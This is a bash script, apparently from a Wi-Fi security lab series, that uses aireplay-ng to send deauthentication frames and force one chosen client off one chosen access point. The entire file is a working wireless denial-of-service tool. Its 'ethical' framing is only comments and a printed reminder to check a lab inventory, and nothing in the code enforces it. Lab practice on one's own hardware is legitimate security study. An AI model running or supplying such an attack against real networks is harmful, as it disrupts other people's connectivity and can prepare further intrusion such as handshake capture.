#!/usr/bin/env bash
# Targeted deauth: kicks ONE specific client off ONE specific AP.
# Cleanest, most ethical variant — affects exactly the device you name.
#
# Usage:
#   sudo ./04-deauth-targeted.sh -a <bssid> -c <client-mac> -i <iface> [-n <frames>]

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -a <bssid> -c <client-mac> -i <iface> [-n <frames>]"
}

BSSID="" CLIENT="" IFACE="" COUNT=10
while getopts "a:c:i:n:" opt; do
    case "$opt" in
        a) BSSID=$OPTARG ;;
        c) CLIENT=$OPTARG ;;
        i) IFACE=$OPTARG ;;
        n) COUNT=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$BSSID" || -z "$CLIENT" || -z "$IFACE" ]] && usage

warn "Targeted deauth:"
warn "  AP BSSID    = $BSSID"
warn "  Client MAC  = $CLIENT"
warn "  Frames      = $COUNT"
warn "Confirm BOTH MACs are listed in lab-notes/inventory.md as YOURS."
sleep 3

aireplay-ng --deauth "$COUNT" -a "$BSSID" -c "$CLIENT" "$IFACE"
